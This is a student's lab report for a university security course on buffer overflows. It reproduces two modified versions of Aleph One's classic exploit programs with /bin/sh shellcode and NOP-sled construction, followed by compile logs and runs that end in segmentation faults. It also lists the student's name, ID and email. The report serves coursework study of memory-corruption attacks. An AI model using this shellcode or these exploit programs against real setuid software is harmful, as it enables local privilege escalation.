@@ -1,0 +1,224 @@
+CEG 429 Lab 3: Probing
+Spencer Bryant
+CEG42921
+U00609125
+BryantS620@gmail.com
+
+~ceg42900/bin/turnin L3 SpencerBryant429L3.pdf
+Introduction
+This experiment was to help us fully understand the mechanism behind the buffer 
+overflow exploit mechanic using examples from Aleph One.
+-----------------------------------------
+Experiment Setup
+I used knuth.osis.cs.wright.edu as my primary machine.  I downloaded all files to that machine 
+running under the regular Linux build.  when i realized I couldn't get sudo mount to work, I switched into Knoppix.
+-----------------------------------------
+I began by compiling Aleph One's code and making small changes to it until it compiled 
+(adding in appropriate header files, and changing main to int rather than void, for example) without errors using 
+gcc -ansi - pedantic -Wall
+I tested this on Linux and it gave a segmentation fault error when used on vulnerable.c.
+
+I began to work on getting the VMWare Player installed, but had problems with the 64-bit version hosted on the shared drive,
+since I apparently needed 32-bit.  I changed operating systems to Knoppix as per the lab instructions and tried 
+the already-installed VirtualBox, but it would not capture mouse input, and would not install the guest addons 
+necessary for capturing mouse input.  I switched to VMWare, and was in the process of installing it, when the 
+entire machine froze for 10+ minutes.  I had to reboot and lost the virtual machine install as well as the 
+downloads, and by this time it was too late to begin it all again.
+---------------------------------------------
+Recorded Observations
+
+exploit3a.c (MINE)
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+#define DEFAULT_OFFSET                    0
+#define DEFAULT_BUFFER_SIZE             512
+#define NOP                            0x90
+
+char shellcode[] =
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+unsigned int get_sp(void) {
+ __asm__("movl %esp,%eax");
+return 0;
+}
+
+int main(int argc, char *argv[]) {
+  char *buff, *ptr;
+  unsigned int *addr_ptr, addr;
+  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
+  int i, shellsize;
+  int halfb;
+
+  if (argc > 1) bsize  = atoi(argv[1]);
+  if (argc > 2) offset = atoi(argv[2]);
+
+  if (!(buff = malloc(bsize))) {
+    printf("Can't allocate memory.\n");
+    exit(0);
+  }
+
+  addr = get_sp() - offset;
+  printf("Using address: 0x%x\n", addr);
+
+  ptr = buff;
+  halfb = bsize/2;
+  addr_ptr = (unsigned int *) ptr;
+  for (i = 0; i < bsize; i+=4)
+    *(addr_ptr++) = addr;
+
+  for (i = 0; i < halfb; i++)
+    buff[i] = (char)NOP;
+
+  shellsize = strlen(shellcode);
+  ptr = buff + ((halfb) - (shellsize/2));
+  for (i = 0; i < shellsize; i++)
+    *(ptr++) = shellcode[i];
+
+  buff[bsize - 1] = '\0';
+
+  memcpy(buff,"EGG=",4);
+  putenv(buff);
+  system("/bin/bash");
+return 0;
+}
+
+exploit4a.c (MINE)
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+#define DEFAULT_OFFSET                    0
+#define DEFAULT_BUFFER_SIZE             512
+#define DEFAULT_EGG_SIZE               2048
+#define NOP                            0x90
+
+char shellcode[] =
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+unsigned long get_esp(void) {
+   __asm__("movl %esp,%eax");
+return 0;
+}
+
+int main(int argc, char *argv[]) {
+  char *buff, *ptr, *egg;
+  unsigned int *addr_ptr, addr;
+  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
+  int i, eggsize=DEFAULT_EGG_SIZE;
+
+  if (argc > 1) bsize   = atoi(argv[1]);
+  if (argc > 2) offset  = atoi(argv[2]);
+  if (argc > 3) eggsize = atoi(argv[3]);
+
+
+  if (!(buff = malloc(bsize))) {
+    printf("Can't allocate memory.\n");
+    exit(0);
+  }
+  if (!(egg = malloc(eggsize))) {
+    printf("Can't allocate memory.\n");
+    exit(0);
+  }
+
+  addr = get_esp() - offset;
+  printf("Using address: 0x%x\n", addr);
+
+  ptr = buff;
+  addr_ptr = (unsigned int *) ptr;
+  for (i = 0; i < bsize; i+=4)
+    *(addr_ptr++) = addr;
+
+  ptr = egg;
+  for (i = 0; i < eggsize - strlen(shellcode) - 1; i++)
+    *(ptr++) = (char)NOP;
+
+  for (i = 0; i < strlen(shellcode); i++)
+    *(ptr++) = shellcode[i];
+
+  buff[bsize - 1] = '\0';
+  egg[eggsize - 1] = '\0';
+
+  memcpy(egg,"EGG=",4);
+  putenv(egg);
+  memcpy(buff,"RET=",4);
+  putenv(buff);
+  system("/bin/bash");
+return 0;
+}
+
+gcc -D_XOPEN_SOURCE -ansi -pedantic -Wall exploit3.c will run without errors.  the extra flag -D_XOPEN_SOURCE is to get rid of the warning for implicit declaration of 'putenv'.
+
+gcc -D_XOPEN_SOURCE -ansi -pedantic -Wall exploit4.c will run without errors.  the extra flag -D_XOPEN_SOURCE is to get rid of the warning for implicit declaration of 'putenv'.
+
+output from shell when compiling and comparing size:
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+ceg42921@knuth:~/Desktop$ gcc -D_XOPEN_SOURCE -ansi -pedantic -Wall exploit3.c
+ceg42921@knuth:~/Desktop$ gcc -D_XOPEN_SOURCE -ansi -pedantic -Wall exploit4.c
+ceg42921@knuth:~/Desktop$ size 3.out
+   text	   data	    bss	    dec	    hex	filename
+   2277	    616	     16	   2909	    b5d	3.out
+ceg42921@knuth:~/Desktop$ gcc -D_XOPEN_SOURCE -ansi -pedantic -Wall exploit3a.c -o 3a.out
+ceg42921@knuth:~/Desktop$ size 3a.out
+   text	   data	    bss	    dec	    hex	filename
+   2176	    616	     16	   2808	    af8	3a.out
+ceg42921@knuth:~/Desktop$ gcc -D_XOPEN_SOURCE -ansi -pedantic -Wall exploit3.c -o 3.out
+ceg42921@knuth:~/Desktop$ size 3a.out
+   text	   data	    bss	    dec	    hex	filename
+   2128	    616	     16	   2760	    ac8	3a.out
+ceg42921@knuth:~/Desktop$ size 3.out
+   text	   data	    bss	    dec	    hex	filename
+   2176	    616	     16	   2808	    af8	3.out
+ceg42921@knuth:~/Desktop$ gcc -D_XOPEN_SOURCE -ansi -pedantic -Wall vulnerable.c -o vulnerable.out
+vulnerable.c:1:6: warning: return type of ‘main’ is not ‘int’ [-Wmain]
+vulnerable.c: In function ‘main’:
+vulnerable.c:5:5: warning: implicit declaration of function ‘strcpy’ [-Wimplicit-function-declaration]
+vulnerable.c:5:5: warning: incompatible implicit declaration of built-in function ‘strcpy’ [enabled by default]
+ceg42921@knuth:~/Desktop$ gcc -D_XOPEN_SOURCE -ansi -pedantic -Wall vulnerable.c -o vulnerable.out
+ceg42921@knuth:~/Desktop$ ./3a.out vulnerable.out
+Using address: 0x0
+Segmentation fault (core dumped)
+ceg42921@knuth:~/Desktop$ ./3.out vulnerable.out
+Using address: 0x0
+Segmentation fault (core dumped)
+ceg42921@knuth:~/Desktop$ mkdir -p /tmp/5 /tmp/Auditor
+ceg42921@knuth:~/Desktop$ mount -o ro /dev/sda5 /temp /5
+mount: only root can do that
+ceg42921@knuth:~/Desktop$ sudo mount -o ro /dev/sda5 /temp/5
+[sudo] password for ceg42921: 
+ceg42921 is not in the sudoers file.  This incident will be reported.
+ceg42921@knuth:~/Desktop$ 
+--------------------------------------LOL! wrong OS!--------------------------------------------
+
+
+This is where I tried to switch OS and lost the rest of my data.
+
+---------------------------------------------
+Interpretation of Recorded Observations
+there are a lot of compiler warnings that compilers can deal with rather well.  Also, changing file size of a 
+fairly concise program is much harder than it looks.
+---------------------------------------------
+Remarks
+I have used VirtualBox AND VMWare at home and I've never had an easy time installing a new OS.  
+I had issues today with 0 bytes available for swap space, and no way to change this value 
+(it isn't in the preferences of Machine Settings menus), no mouse input, low HD space 
+(even with 2GB allocated), and various other issues.  The lab seems to assume that the installations will work 
+fine without any additional work.  this is not the case.  I can understand that we should be able to handle 
+the extra work, but that should be reflected in the lab handout so we will know what to expect.
+
+---------------------------------------------
+Conclusions
+
+To be determined upon finalizing the rest of the lab.
+---------------------------------------------
+
